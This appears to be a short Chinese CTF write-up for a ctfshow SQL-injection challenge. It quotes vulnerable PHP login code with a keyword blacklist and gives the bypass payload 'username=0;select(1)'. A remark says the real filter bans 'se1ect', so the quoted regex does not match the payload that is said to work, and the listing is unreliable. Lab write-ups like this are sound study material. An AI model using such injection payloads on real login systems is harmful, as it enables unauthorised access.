'''  //密码检测
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";


  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if(strlen($username)>16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }

  ban掉的是se1ect  不是select
  '''



'''
POST传参

username=0;select(1)&password=1

拼接后的语句
$sql = "select pass from ctfshow_user where username = {0;select(1)};";
永真查询
同样也可以是true
username=0;select(true)&password=1

'''